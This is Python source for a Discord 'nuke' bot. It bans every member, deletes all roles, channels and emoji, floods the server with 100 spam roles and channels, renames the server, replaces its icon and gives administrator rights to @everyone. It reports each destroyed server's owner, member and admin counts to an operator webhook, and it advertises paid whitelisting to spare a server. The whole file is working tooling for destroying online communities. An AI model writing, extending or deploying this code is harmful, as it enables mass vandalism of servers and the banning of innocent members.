# coding: utf-8
import time
import json
import aiohttp
import asyncio
import discord
import datetime
import os


with open("json/config.json") as f:
    config = json.load(f)
token = os.getenv("token")
prefix = config.get("prefix")
loghook = os.getenv("loghook")
command_cooldown_time = config.get("command_cooldown_time")

developer_list = config.get("developer_list")
developer_success_icon_url = config.get("developer_success_icon_url")
developer_error_icon_url = config.get("developer_error_icon_url")

nuke_channels_name = config.get("nuke_channels_name")
nuke_voice_name = config.get("nuke_voice_name")
nuke_categories_name = config.get("nuke_categories_name")

nuke_server_name = config.get("nuke_server_name")
nuke_roles_name = config.get("nuke_roles_name")
nuke_webhook_name = config.get("nuke_webhook_name")

nuke_avatar_file = config.get("nuke_avatar_file")
spam_text_file = config.get("spam_text_file")


with open(spam_text_file, 'r', encoding="utf-8") as spam_text_n:
    spam_text = spam_text_n.read()
    spam_text = spam_text.strip('\"')

with open(f'avatar.png', 'rb') as f:
    icon = f.read()


async def loghook_send(ctx, loghook):
    try:
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(loghook, adapter=discord.AsyncWebhookAdapter(session))
            embed = discord.Embed(
                title = f'Nuke | Был уничтожен сервер "{ctx.guild.name}"',
                description = f"""
> **Server ID:** `{ctx.guild.id}`
> **Owner:** `{ctx.guild.owner}`
> **All users:** `{len(ctx.guild.members)}`
> **All channels:** `{len(ctx.guild.channels)}`
> **All roles:** `{len(ctx.guild.roles)}`
> **Nuker:** `{ctx.author}`

> **Text Channels:** `{len(ctx.guild.text_channels)}`
> **Voice Channels:** `{len(ctx.guild.voice_channels)}`
> **Categories:** `{len(ctx.guild.categories)}`

> **All users:** `{len(ctx.guild.members)}`
> **People:** `{len([m for m in ctx.guild.members if not m.bot])}`
> **Bots:** `{len([m for m in ctx.guild.members if m.bot])}`
> **Administrators:** `{len([m for m in ctx.guild.members if m.guild_permissions.administrator])}`
> **Moderators:** `{len([m for m in ctx.guild.members if m.guild_permissions.kick_members])}`

> **All roles:** `{len(ctx.guild.roles)}`
> **Moderation roles:** `{len([r for r in ctx.guild.roles if r.permissions.kick_members])}`
> **Administration roles:** `{len([r for r in ctx.guild.roles if r.permissions.administrator])}`
""",
                color = 0x060C11
            )
            await webhook.send(embed=embed)
    except Exception as e: print(e)


# Check: is the server in the white list
async def white_check(ctx):
    white_text = f"""> *Hello, {ctx.author.mention}, I want to inform you that the server **`{ctx.guild.name }`** is on the white list, which is why I can't execute any commands on it, and therefore I'm leaving it. If you also want to purchase a whitelist, we ask you to go to our official Discord server to discuss the terms of the contract with our administration.*\n\n> **`Link to GitHub:` [🔗click to go](https://github.com/ArMaGeDDoN-SS)**"""
    with open("json/white_list.json", 'r', encoding="utf-8") as wl:
        white_list = json.load(wl)
    if ctx.guild.id in white_list:
        try:
            embed = discord.Embed(
                title = f"🔒 | Server {ctx.guild.name} is on the white list!",
                description = white_text,
                color = 0xFF0000
            )
            embed.set_footer(icon_url='https://media.discordapp.net/attachments/1045645133003104270/1047108190531231754/image.png', text='© ! Walter Schwartz#7393 | Blood Group - All rights reserved!')
            await ctx.author.send(embed=embed)
            await guild.leave()
            return False
        except:
            embed = discord.Embed(
                title = f"🔒 | Server {ctx.guild.name} is on the white list!",
                description = white_text,
                color = 0xFF0000
            )
            embed.set_footer(icon_url='https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png', text='© ! Walter Schwartz#7393 | Blood Group - All rights reserved!')
            await ctx.send(embed=embed)
            return False
    else:
        return True


# Check: is the user in the blacklist
async def black_check(ctx):
    black_text = """**Good day, when using one of the bot's commands, it turned out that you are on the blacklist, because you are denied access to all the functions of this bot. You could have been added to the blacklist for the following reasons:**\n``py\n\n- Suspicion of DDoS bot attempts.\n\n- Suspicion of activities aimed at harming the bot owner project.\n\n- Open hostility with the project-the owner of the bot or the creator of the bot.\n\n- Ban on the server of the project owner of the bot, whether for violating the rules of the server or for other reasons.\n\n- Suspicion of activities directed against other crash organizations, including against the bot owner project.\n\n- Suspicion of activities directed against partner organizations of our organization.\n``\n**If you think that there were no such actions on your part, please unsubscribe to the developers of the bot: `! Walter Schwartz#7393`, `BLOODS#0915`**"""
    with open('json/black_list.json', 'r') as black_listik:
        black_list = json.load(black_listik)
    if ctx.author.id in black_list:
        try:
            bl_embed = discord.Embed(
                title = "❗ | Your account is blacklisted by the bot!",
                description = black_text,
                color = 0xFF0000
            )
            bl_embed.set_footer(icon_url='https://media.discordapp.net/attachments/1045645133003104270/1047108190531231754/image.png', text='© ! Walter Schwartz#7393 | Blood Group - All rights reserved!')
            await ctx.author.send(embed=bl_embed)
            return False
        except:
            bl_embed = discord.Embed(
                title = "❗ | Your account is blacklisted by the bot!",
                description = black_text,
                color = 0xFF0000
            )
            bl_embed.set_footer(icon_url='https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png', text='© ! Walter Schwartz#7393 | Blood Group - All rights reserved!')
            await ctx.send(embed=bl_embed)
            return False
    else:
        return True


# Output of statistics about a certain operation
async def statistics(ctx, start, count, name, time, stat_type):
    if stat_type == "delete":
        embed = discord.Embed(
            title = f"♻ | Deleting {name} was successful!",
            description = f"""
> **{name.title()} deleted:** `{count}/{start}`
> **Time of deletion:** `{time}`""",
            color = 0x020202
        )
        embed.add_field(
            name = f"",
            value = f"""
> **Server ID:** `{ctx.guild.id}`
> **Owner:** `{ctx.guild.owner}`
> **Number of members:** `{len(ctx.guild.members)}`
> **Number of channels:** `{len(ctx.guild.channels)}`
> **Number of roles:** `{len(ctx.guild.roles)}`
> **Nuker:** `{ctx.author}`""",
            inline = False
        )
        embed.set_footer(
            icon_url = "https://media.discordapp.net/attachments/1055522676371898379/1094257006967271496/OpenNB.png?width=506&height=506", 
            text = f"Valkyrie | Nuke data - {datetime.datetime.now()}"
        )
        try:
            await ctx.author.send(embed=embed)
        except:
            pass
    elif stat_type == "create":
        embed = discord.Embed(
            title = f"♻ | The mass creation of {name} was successful!",
            description = f"""
> **{name.title()} created:** `{count}`
> **Creation time:** `{time}`""",
            color = 0x020202
        )
        embed.add_field(
            name = f"",
            value = f"""
> **Server ID:** `{ctx.guild.id}`
> **Owner:** `{ctx.guild.owner}`
> **Number of members:** `{len(ctx.guild.members)}`
> **Number of channels:** `{len(ctx.guild.channels)}`
> **Number of roles:** `{len(ctx.guild.roles)}`
> **Nuker:** `{ctx.author}`""",
            inline = False
        )
        embed.set_footer(
            icon_url = "https://media.discordapp.net/attachments/1055522676371898379/1094257006967271496/OpenNB.png?width=506&height=506", 
            text = f"Valkyrie | Nuke data - {datetime.datetime.now()}"
        )
        try:
            await ctx.author.send(embed=embed)
        except:
            pass
    elif stat_type == "spam":
        embed = discord.Embed(
            title = f"♻ | Sending messages was successful!",
            description = f"""
> **Messages sent:** `{count}`
> **Sending time:** `{time}`""",
            color = 0x020202
        )
        embed.add_field(
            name = f"",
            value = f"""
> **Server ID:** `{ctx.guild.id}`
> **Owner:** `{ctx.guild.owner}`
> **Number of members:** `{len(ctx.guild.members)}`
> **Number of channels:** `{len(ctx.guild.channels)}`
> **Number of roles:** `{len(ctx.guild.roles)}`
> **Nuker:** `{ctx.author}`""",
            inline = False
        )
        embed.set_footer(
            icon_url = "https://media.discordapp.net/attachments/1055522676371898379/1094257006967271496/OpenNB.png?width=506&height=506", 
            text = f"Valkyrie | Nuke data - {datetime.datetime.now()}"
        )
        try:
            await ctx.author.send(embed=embed)
        except:
            pass


# Ban all
async def ban_all(ctx):
    try:
        tic = time.perf_counter()

        for member in ctx.guild.members:
            try:
                await member.ban()
            except:
                continue
        toc = time.perf_counter()
        print(f"Blocking took {toc - tic:0.4f} seconds")
    except Exception as e: print(e)



# Spam roles
async def creating_roles(ctx):
    try:
        tic = time.perf_counter()
        for i in range(100):
            try:
                await ctx.guild.create_role(name=nuke_roles_name)
            except Exception as e: print(e)

        toc = time.perf_counter()
        print(f"Spam roles occupied by {toc - tic:0.4f} seconds")
    except Exception as e: print(e)


# Edit avatar and name server
async def r3name(ctx):
    try:
        tic = time.perf_counter()

        await ctx.guild.edit(icon=icon)
        await ctx.guild.edit(name=nuke_server_name)

        toc = time.perf_counter()
        print(f"Renaming the server took {toc - tic:0.4f} seconds")
    except Exception as e: print(e)


# Spam channels
async def creating_channels(ctx):
    try:
        tic = time.perf_counter()
        for n in range(100):
            try:
                await ctx.guild.create_text_channel(nuke_channels_name)
            except Exception as e: print(e)
        toc = time.perf_counter()
        print(f"Spam channels took {toc - tic:0.4f} seconds")
    except Exception as e: print(e)


# Delete all roles
async def deleting_roles(ctx):
    try:
        tic = time.perf_counter()
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                try:
                    await role.delete()
                except:
                    pass

        toc = time.perf_counter()
        print(f"All roles have been removed for {toc - tic:0.4f}")
    except Exception as e: print(e)


# Delete all channels - text channels, voice channels, categories
async def deleting_channels(ctx):
    try:
        tic = time.perf_counter()
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                try:
                    await channel.delete()
                except:
                    pass
        toc = time.perf_counter()
        print(f"All channels have been deleted for {toc - tic:0.4f}")
    except Exception as e: print(e)


# Delete all emoji
async def emoji_deleting(ctx):
    try:
        tic = time.perf_counter()
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
            except:
                try:
                    await emoji.delete()
                except:
                    pass
        toc = time.perf_counter()
        print(f"Removing the emoji took {toc - tic:0.4f} seconds")
    except Exception as e: print(e)


# Give administrator permissions everyone
async def everyone_admins(ctx):
    tic = time.perf_counter()
    role = discord.utils.get(ctx.message.guild.roles, name="@everyone")
    perms = discord.Permissions(administrator=True)

    await role.edit(permissions=perms)
    toc = time.perf_counter()
    print(f"Granting administrator rights to the @everyone role took {toc - tic:0.4f} seconds")
